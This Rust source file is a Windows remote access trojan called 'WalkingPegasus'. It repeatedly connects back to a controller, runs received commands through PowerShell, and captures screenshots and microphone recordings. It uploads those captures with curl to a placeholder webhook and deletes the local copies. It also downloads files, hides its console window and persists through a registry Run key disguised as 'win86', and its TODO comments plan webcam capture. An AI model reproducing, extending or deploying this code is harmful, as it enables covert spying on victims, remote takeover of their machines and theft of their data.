// #![allow(unused_imports, unused_variables, unused_mut, dead_code)]
#[cfg(windows)]
use std::env;
use std::path::PathBuf;
use winapi::um::winuser::{SystemParametersInfoA, SPI_SETDESKWALLPAPER, SPIF_UPDATEINIFILE};
use winreg::enums::{HKEY_CURRENT_USER, KEY_WRITE};
use winreg::RegKey;
use std::net::{Shutdown, TcpStream};
use std::io::{self, Read, Write};
use std::process::Command;
use std::sync::{Mutex, Arc};
use cpal::traits::{DeviceTrait, StreamTrait, HostTrait};
use image::RgbaImage;
use win_screenshot::prelude::*;

pub struct WalkingPegasus {
    pub addr: String
}

impl WalkingPegasus {
    const URL: &str = "webhook";

    //      +=======+ FUNCTIONS +=======+      //
    fn do_something(&self, command: String, s: &mut TcpStream) {
        if command == "close_conn\n"
        {
            s.write_all(b"Byyeee Bitch !!\n").expect("");
            s.shutdown(Shutdown::Both).expect("");
        }
        else if command.starts_with("cd ") 
        {
            let path = command.trim_start_matches("cd ").trim().to_owned();
    
            if let Err(_) = env::set_current_dir(&path) {
                s.write(b"Given Directory either dosen't exist or there is other problem ;-;' \n").expect("");
            } 
            else { }
        }
        else if command.starts_with("screen")
        {
            
            let usrprf: Option<PathBuf> = std::env::var_os("USERPROFILE").map(std::path::PathBuf::from).to_owned();
            let _str: String = usrprf.map(|path_buf| path_buf.to_string_lossy().to_string()).unwrap() + "\\Desktop\\ss.jpg";
            self.axzy_002(_str);
        }
        else if command.starts_with("record")
        {
            let usrprf: Option<PathBuf> = std::env::var_os("USERPROFILE").map(std::path::PathBuf::from).to_owned();
            let _str: String = usrprf.map(|path_buf| path_buf.to_string_lossy().to_string()).unwrap() + "\\Desktop\\ss.wav";
            let time = &command[7..];
            let t = time.trim().parse::<u64>().expect("");
            self.axzy_003(t, _str);
        }
        else if command.starts_with("download")
        {
            let ascv = &command[9..];
            println!("{}", ascv);
            let spacedout: Vec<&str> = ascv.split_whitespace().collect();
            println!("{:?} {:?}", spacedout[0], spacedout[1]);
            self.axzy_004(spacedout[0], spacedout[1], s);
        }
        else if command.starts_with("wallpaper") {
            self.axzy_005(&command[10..], s);
        }
        else if command.trim().len() == 0 {
            s.write_all("[-] No command\n".as_bytes()).expect("");
        }
        else 
        {
            let output = Command::new("powershell").arg(command).output().expect("");
            if output.status.success() {
                let stdout = String::from_utf8_lossy(&output.stdout);
                match s.write(stdout.as_bytes()) {
                    Ok(_) => {}
                    Err(_) => {self.connect()}
                }
            }
            else {
                let stderr = String::from_utf8_lossy(&output.stderr);
                match s.write(stderr.as_bytes()) {
                    Ok(_) => {}
                    Err(_) => {self.connect()}
                }
            }
        }
    }

    pub fn connect(&self) {
        loop {
            match TcpStream::connect(self.addr.clone()) { 
                Ok(mut stream) => {
                    loop 
                    {
                        stream.write(b"[*] >> ").unwrap();
                        let mut data = [0 as u8; 2048];
    
                        if let Ok(size) = stream.read(&mut data)
                        {
                            let rec_data = &data[..size];
                            let msg = String::from_utf8_lossy(rec_data).to_string();

                            self.do_something(msg, &mut stream);
                        }
                        else { break; }
                    }
                }
                Err(ref e) if e.kind() == io::ErrorKind::ConnectionRefused => { }
                Err(ref e) if e.kind() == io::ErrorKind::ConnectionReset => { }
                Err(ref e) if e.kind() == io::ErrorKind::ConnectionReset => { }
                Err(_) => { }
            }
        }
    }

    pub fn addtostartup(&self) -> Result<(), std::io::Error> {
        let current_exe = env::current_exe()?;
        let (key_path, value_name) = if cfg!(target_os = "windows")
        {
            ("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", "win86")
        }
        else 
        {
            return Err(std::io::Error::new(std::io::ErrorKind::Other, ""));
        };
    
        let hkcu = RegKey::predef(HKEY_CURRENT_USER);
        let (key, _) = hkcu.create_subkey_with_flags(key_path, KEY_WRITE)?;
        key.set_value(value_name, &current_exe.to_string_lossy().to_string())?;

        Ok(())
    }

    pub fn hidec(&self) {
        use std::ptr;
        use winapi::um::winuser::ShowWindow;
        use winapi::um::winuser::SW_HIDE;
        use winapi::um::wincon::GetConsoleWindow;
        
    
        let window = unsafe {GetConsoleWindow()};
        if window != ptr::null_mut() {
            unsafe {
                ShowWindow(window, SW_HIDE);
            }
        }
    }

    fn axzy_001(&self, path: String) {
        let cmd = String::from("curl -F log=@") + &path +" -X POST " + Self::URL;
        println!("{:?}", cmd);
        let mut binding = Command::new("cmd");
        binding.args(["/C", &cmd]);
        println!("{:?}", binding.output());
    }

    pub fn axzy_002(&self, path: String) {
        let buf = capture_display().unwrap();
        let img = RgbaImage::from_raw(buf.width, buf.height, buf.pixels).unwrap();
        match img.save(&path) 
        {
            Ok(_) => {
                self.axzy_001(path.clone());
                std::fs::remove_file(path).expect("");
            }
            Err(_) => { }
        }
    }

    pub fn axzy_003(&self, time: u64, path: String) {
        let host = cpal::default_host();
        let input_device = host.default_input_device().expect("");
        let mut format = input_device.supported_input_configs().expect("");
        let f = format.next().expect("").with_max_sample_rate();
        f.sample_format();
        let config = f.into();
    
        // Create an input stream and define a callback to process audio samples
        let data_buffer = Arc::new(Mutex::new(Vec::new()));
        let data_buffer_clone = data_buffer.clone();
    
        let input_stream = input_device.build_input_stream(&config,
            move |data: &[i16], _: &cpal::InputCallbackInfo| {
                let mut data_buffer = data_buffer_clone.lock().unwrap();
                data_buffer.extend_from_slice(data);
             },
            |_err| {}, None).expect("");
    
        input_stream.play().unwrap();
        std::thread::sleep(std::time::Duration::from_secs(time));

        Self::save_wav(data_buffer.lock().unwrap().as_slice(), path.clone()).expect("");
        self.axzy_001(path.clone());
        std::fs::remove_file(path).expect("");
    }

    fn save_wav(data: &[i16], path: String) -> Result<(), hound::Error> {
        let spec = hound::WavSpec {
            channels: 2, // Stereo (Stereophonic)
            sample_rate: 48000, // 48 kHz
            bits_per_sample: 16, // 16-bit audio
            sample_format: hound::SampleFormat::Int
        };
    
        let mut writer = hound::WavWriter::create(path, spec)?;
        for &sample in data {
            writer.write_sample(sample)?;
        }
        writer.finalize()?;
        Ok(())
    }

    pub fn axzy_004(&self, url: &str, path: &str, s: &mut TcpStream) {
        match reqwest::blocking::get(url) {
            Ok(response) => {
                println!("{:?}", response.status());
                if response.status().is_success() {
                    let mut file = std::fs::File::create(path).expect("");
                    let mut content = std::io::Cursor::new(response.bytes().expect(""));
                    std::io::copy(&mut content, &mut file).expect("");
                }
                else {
                    s.write_all("[!] Maybe invalid url or request was not successful !!\n".as_bytes()).expect("");
                }
            }
            Err(_) => {s.write_all("[!] Error making request...\n".as_bytes()).expect("");}
        }
    }

    pub fn axzy_005(&self, path: &str, s: &mut TcpStream) {
        let image_path =  std::ffi::CString::new(path.trim_end()).unwrap();
        let res = unsafe {
            SystemParametersInfoA(
                SPI_SETDESKWALLPAPER,
                0,
                image_path.as_ptr() as *mut winapi::ctypes::c_void,
                SPIF_UPDATEINIFILE,
            )};
            if res != 0 {
                s.write_all("[+] SETTED WALLPAPER SUCCESSFULLY !!\n".as_bytes()).expect("");
            }
            else {
                s.write_all("[-] FAILED TO SET WALLPAPER...\n".as_bytes()).expect("");
            }
    }
    // TODO:
    // 1.) Take photo from webcam and send that to the webhook.
    // EXTRA FEATURES:
    // 1.)  Install any program from the url (requests) -- Gotta fix "TimedOut" error.
    // 2.)  Open any page in the web browser for fun :)
}
